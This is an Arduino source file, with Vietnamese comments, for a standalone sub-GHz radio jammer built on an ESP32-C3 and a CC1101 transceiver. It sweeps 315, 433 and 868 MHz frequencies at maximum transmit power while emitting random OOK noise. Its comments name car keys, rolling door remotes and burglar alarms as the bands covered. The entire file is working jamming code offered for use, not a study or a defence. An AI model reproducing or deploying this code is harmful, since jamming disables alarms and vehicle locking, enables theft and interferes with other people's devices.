#include <Arduino.h>
#include <ELECHOUSE_CC1101_SRC_DRV.h>

// ===================== PINS (so do cu ESP-GRABER) =====================
#define CC1101_GDO0 10
#define CC1101_CS   5
#define CC1101_SCK  4
#define CC1101_MOSI 7
#define CC1101_MISO 6
#define LED_PIN     8   // Den onboard ESP32-C3 super mini

// Thoi gian dung lai tren moi tan so (ms)
#define DWELL_TIME_MS 120

// ===================== DANH SACH TAN SO SUB-GHZ =====================
// Lay theo phong cach ESP-C3-Pocket-Puter: quet vong toan bo dai tan
const float jam_frequency_list[] = {
  // === Dai 315 MHz (chia khoa o to, remote cua cuon gia re tai VN) ===
  314.900f, 315.000f, 315.100f, 315.200f, 315.300f,
  318.000f, 330.000f, 345.000f, 348.000f, 350.000f,

  // === Dai 433.05 - 434.79 MHz (ISM VN: cua cuon, bao trom, den, quat...) ===
  // Quet day tung buoc 0.05 MHz de phu kin toan dai
  433.050f, 433.100f, 433.150f, 433.200f, 433.250f, 433.300f, 433.350f,
  433.400f, 433.450f, 433.500f, 433.550f, 433.600f, 433.650f, 433.700f,
  433.750f, 433.800f, 433.850f, 433.889f, 433.920f, 433.950f, 434.000f,
  434.050f, 434.100f, 434.150f, 434.177f, 434.190f, 434.200f, 434.250f,
  434.300f, 434.350f, 434.390f, 434.400f, 434.420f, 434.450f, 434.500f,
  434.550f, 434.600f, 434.650f, 434.700f, 434.750f, 434.790f,

  // === Dai 868 MHz (mot so thiet bu nhap khau Chau Au dung tai VN) ===
  868.000f, 868.300f, 868.350f, 868.400f, 868.500f, 868.800f, 868.950f
};
const int jam_frequency_count = sizeof(jam_frequency_list) / sizeof(jam_frequency_list[0]);

unsigned long dwellTimer = 0;
unsigned long ledTimer = 0;
bool ledState = false;
int freqIdx = 0;

void startJamFreq(float freq) {
  ELECHOUSE_cc1101.setMHZ(freq);
  ELECHOUSE_cc1101.SetTx();
  ELECHOUSE_cc1101.SpiWriteReg(0x3E, 0xFF);  // PATABLE max
  ELECHOUSE_cc1101.SpiWriteReg(0x35, 0x60);
}

void setup() {
  Serial.begin(115200);
  Serial.println();
  Serial.println(F("========== ESP-C3 JAMMER =========="));
  Serial.println(F("Standalone - cam nguon la chay"));

  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, HIGH);

  ELECHOUSE_cc1101.setSpiPin(CC1101_SCK, CC1101_MISO, CC1101_MOSI, CC1101_CS);
  ELECHOUSE_cc1101.setGDO0(CC1101_GDO0);
  ELECHOUSE_cc1101.Init();
  ELECHOUSE_cc1101.setModulation(0);   // OOK/ASK
  ELECHOUSE_cc1101.setDeviation(0);
  ELECHOUSE_cc1101.setRxBW(270.0);
  ELECHOUSE_cc1101.setPA(12);          // Cong suat phat CC1101 toi da

  pinMode(CC1101_GDO0, OUTPUT);

  startJamFreq(jam_frequency_list[0]);
  dwellTimer = millis();

  Serial.print(F("Jamming VN bands - ")); Serial.print(jam_frequency_count); Serial.println(F(" frequencies..."));
  digitalWrite(LED_PIN, LOW);
}

void loop() {
  // Nhay LED nhip tim - bao hieu dang hoat dong
  if (millis() - ledTimer >= 100) {
    ledTimer = millis();
    ledState = !ledState;
    digitalWrite(LED_PIN, ledState ? HIGH : LOW);
  }

  // Gay nhieu: xung ngau nhien tren GDO0 (OOK noise) - giong Pocket-Puter
  uint16_t r = random(200, 1000);
  digitalWrite(CC1101_GDO0, HIGH);
  delayMicroseconds(r);
  digitalWrite(CC1101_GDO0, LOW);
  delayMicroseconds(r);

  // Chuyen tan so sau moi DWELL_TIME_MS -> quet vong toan bo dai tan
  if (millis() - dwellTimer >= DWELL_TIME_MS) {
    dwellTimer = millis();
    freqIdx = (freqIdx + 1) % jam_frequency_count;
    startJamFreq(jam_frequency_list[freqIdx]);
  }
}
